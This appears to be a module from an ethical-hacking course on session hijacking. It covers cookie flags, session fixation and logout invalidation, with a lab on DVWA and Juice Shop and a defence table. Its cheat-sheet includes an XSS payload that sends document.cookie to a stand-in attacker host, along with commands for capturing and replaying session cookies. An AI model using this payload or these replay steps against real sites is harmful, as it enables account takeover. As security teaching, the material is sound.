# Module 11 — Session Hijacking

> *Steal or forge the token that proves who you are, and you skip the password entirely.*

**The goal.** Understand how sessions are maintained (cookies, tokens), how they're stolen or fixed, and why token handling — expiry, flags, rotation — is one of the most common real-world weaknesses.

**Where it fits.** It builds on sniffing (Module 08) and web attacks (Modules 13–14). A stolen session is often the fastest path to a full account takeover.

## Concepts that matter

- **Network-level vs application-level.** Network: capture the token in transit (sniffing/MITM). Application: steal it via XSS, or exploit weak generation/handling.
- **Session fixation.** Force a victim to use a session ID you already know, then ride it after they log in.
- **Why tokens must expire.** A session that never truly dies on logout is exploitable long after the user thinks they're safe — a subtle, common flaw.
- **Cookie security flags.** `HttpOnly` (no JS access), `Secure` (HTTPS only), `SameSite` (CSRF defence) — the absence of each is a finding.

## Command cheat-sheet

```text
# --- Capture a token in transit (with Module 08 techniques) ---
Wireshark filter:  http.cookie        # find Set-Cookie / Cookie headers
tshark -r cap.pcap -Y http.cookie -T fields -e http.cookie

# --- Steal via XSS (see Module 14) ---
<script>new Image().src='//attacker/c?'+document.cookie</script>   # if not HttpOnly

# --- Inspect & replay (Burp Suite) ---
1. Proxy → capture the session cookie
2. Send a request to Repeater, swap in the stolen cookie
3. Confirm you're authenticated as the victim

# --- Analyse token quality ---
Burp Sequencer     # measure session-token randomness/entropy
# Decode JWTs at jwt.io — check alg, expiry (exp), and signature handling
```

## Walk it in your lab

Target: **DVWA** / **OWASP Juice Shop**.

1. Log in and capture your session cookie in Burp. Inspect its flags — is it `HttpOnly`, `Secure`, `SameSite`?
2. Copy the cookie into a separate browser/Repeater session and confirm it grants access — that's a hijack.
3. **Logout, then replay the old cookie.** Does the server actually invalidate it, or does it still work? (This is the session-expiration flaw worth understanding deeply.)
4. If the app has XSS, chain it: use a payload to exfiltrate `document.cookie` (only when the cookie lacks `HttpOnly`).
5. Note every weak flag and every token that outlives its logout.

## What good looks like

Evidence of a captured/replayed session, a verdict on each cookie flag, and — most valuable — a clear test of whether logout genuinely terminates the session server-side.

## Detection & defence

| Weakness | Defence |
|---|---|
| Token stealable via JS | `HttpOnly` cookies |
| Token stealable in transit | `Secure` flag + TLS everywhere |
| Cross-site request riding | `SameSite=Lax/Strict`; CSRF tokens |
| Session outlives logout | **Server-side** invalidation on logout + real idle/absolute expiry |
| Predictable tokens | High-entropy, framework-managed session IDs; rotate on privilege change |

## Common junior mistakes

- Assuming logout works — the interesting bug is when it doesn't. Always test replay-after-logout.
- Trying to read an `HttpOnly` cookie from JavaScript and concluding "no XSS impact."
- Reporting a missing flag without demonstrating the impact it enables.

## Go deeper

- OWASP — [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) · WSTG Session Management · CWE-613

---

> New here? Start with the **[lab setup guide](../LAB-SETUP.md)** and work the modules in order.
